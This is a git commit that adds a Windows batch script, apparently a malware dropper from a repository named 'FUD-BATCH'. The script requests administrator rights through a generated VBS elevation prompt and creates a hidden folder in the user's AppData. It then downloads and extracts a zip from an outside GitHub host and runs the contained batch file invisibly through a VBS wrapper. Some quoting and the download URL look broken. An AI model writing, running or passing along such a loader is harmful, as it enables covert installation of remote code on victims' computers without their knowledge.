c32228bbfb1760fe50da46b602bf8a7db707f672
AnonAm93 <am9.9@outlook.com>
2024-09-15 21:13:49 +0200

    Add files via upload

---
+++ .bat
@@ -0,0 +1,33 @@
+powershell -window hidden -command ""
+
+    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
+>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
+) ELSE (
+>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
+)
+if '%errorlevel%' NEQ '0' (
+    goto UACPrompt
+) else ( goto gotAdmin )
+:UACPrompt
+    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+    set params= %*
+    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs
+    "%temp%\getadmin.vbs"
+    del "%temp%\getadmin.vbs"
+    exit /B
+:gotAdmin
+    pushd "%CD%"
+    CD /D "%~dp0
+
+cd "C:\Users\%USERNAME%\AppData\Local"
+mkdir "Anon"
+attrib +h "Anon" /s /d
+cd C:\Users\%USERNAME%\AppData\Local\Anon" 
+wget https://github.com/AnonAm93/FUD-BATCH/blob/main/1.zip
+tar -xf 1.zip
+del 1.zip
+echo CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False >> C:\Users\%USERNAME%\AppData\Local\Anon\invisible.vbs
+wscript.exe "C:\Users\%USERNAME%\AppData\Local\Anon\invisible.vbs" "C:\Users\%USERNAME%\AppData\Local\Anon\1.bat.bat"
+
+
+
